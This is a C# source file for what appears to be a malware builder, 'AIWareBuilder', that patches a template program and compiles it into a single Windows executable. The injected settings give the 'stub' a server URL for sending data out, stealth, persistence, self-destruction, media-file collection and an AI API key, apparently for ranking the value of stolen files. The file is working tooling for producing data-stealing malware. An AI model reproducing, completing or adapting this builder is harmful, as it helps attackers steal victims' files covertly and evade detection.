using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace AIWareBuilder
{
    public static class BuilderEngine
    {
        public static bool BuildPayload(SettingsManager.StubSettings settings, string outputFolder)
        {
            try
            {
                // Paths
                string basePath = AppDomain.CurrentDomain.BaseDirectory;
                string templatePath = Path.Combine(basePath, "..", "..", "..", "AIWareTemplate");
                templatePath = Path.GetFullPath(templatePath);
                string programPath = Path.Combine(templatePath, "Program.cs");

                if (!File.Exists(programPath))
                {
                    throw new Exception("Template Program.cs not found!");
                }

                // Read original Program.cs
                string programSource = File.ReadAllText(programPath);

                // Generate settings C# code
                string configCode = GenerateConfigCode(settings);

                // Replace CONFIG_MARKER
                string patchedSource = programSource.Replace("/*CONFIG_MARKER*/", configCode);

                // Create temp working folder
                string tempFolder = Path.Combine(Path.GetTempPath(), "AIWareTemp_" + Guid.NewGuid().ToString("N"));
                Directory.CreateDirectory(tempFolder);

                // Copy template files to temp folder
                foreach (var file in Directory.GetFiles(templatePath))
                {
                    File.Copy(file, Path.Combine(tempFolder, Path.GetFileName(file)));
                }
                // Overwrite Program.cs with patched one
                File.WriteAllText(Path.Combine(tempFolder, "Program.cs"), patchedSource);

                // Build the publish command
                string publishArgs = $"publish \"{tempFolder}\" -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:PublishReadyToRun=false -p:EnableCompressionInSingleFile=true -o \"{outputFolder}\"";
                
                // Add icon if specified
                if (!string.IsNullOrEmpty(settings.IconPath) && File.Exists(settings.IconPath))
                {
                    publishArgs += $" -p:ApplicationIcon=\"{settings.IconPath}\"";
                }
                
                // Now publish
                var psi = new ProcessStartInfo()
                {
                    FileName = "dotnet",
                    Arguments = publishArgs,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                var process = new Process();
                process.StartInfo = psi;

                // Create a log file
                string logFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "build_log.txt");
                using (StreamWriter logWriter = new StreamWriter(logFile, true))
                {
                    logWriter.WriteLine($"[{DateTime.Now}] Starting build process...");
                    
                    process.OutputDataReceived += (sender, args) => 
                    {
                        if (args.Data != null)
                        {
                            Console.WriteLine(args.Data);
                            logWriter.WriteLine(args.Data);
                            logWriter.Flush();
                        }
                    };
                    process.ErrorDataReceived += (sender, args) => 
                    {
                        if (args.Data != null)
                        {
                            Console.WriteLine(args.Data);
                            logWriter.WriteLine($"ERROR: {args.Data}");
                            logWriter.Flush();
                        }
                    };

                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();
                process.WaitForExit();


                    if (process.ExitCode != 0)
                    {
                        Console.WriteLine("Build failed:");
                        logWriter.WriteLine($"[{DateTime.Now}] Build failed with exit code: {process.ExitCode}");
                        return false;
                    }
                    
                    logWriter.WriteLine($"[{DateTime.Now}] Build completed successfully.");
                }

                // Clean temp folder
                Directory.Delete(tempFolder, true);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Build error: {ex.Message}");
                return false;
            }
        }

        private static string GenerateConfigCode(SettingsManager.StubSettings settings)
        {
            var sb = new StringBuilder();
            sb.AppendLine("static Program()");
            sb.AppendLine("{");
            sb.AppendLine($"    ServerUrl = \"{settings.ServerUrl}\";");
            sb.AppendLine($"    SampleSizeKB = {settings.SampleSizeKB};");
            sb.AppendLine($"    ValueThreshold = {settings.ValueThreshold};");
            sb.AppendLine($"    StealthEnabled = {settings.StealthEnabled.ToString().ToLower()};");
            sb.AppendLine($"    SelfDestructEnabled = {settings.SelfDestructEnabled.ToString().ToLower()};");
            sb.AppendLine($"    AiApiUrl = \"{settings.AiApiUrl}\";");
            sb.AppendLine($"    AiApiKey = \"{settings.AiApiKey}\";");
            sb.AppendLine($"    ScanMode = \"{settings.ScanMode}\";");
            sb.AppendLine($"    CollectMediaFiles = {settings.CollectMediaFiles.ToString().ToLower()};");
            sb.AppendLine($"    PersistenceEnabled = {settings.PersistenceEnabled.ToString().ToLower()};");
            sb.AppendLine("}");
            return sb.ToString();
        }
    }
}
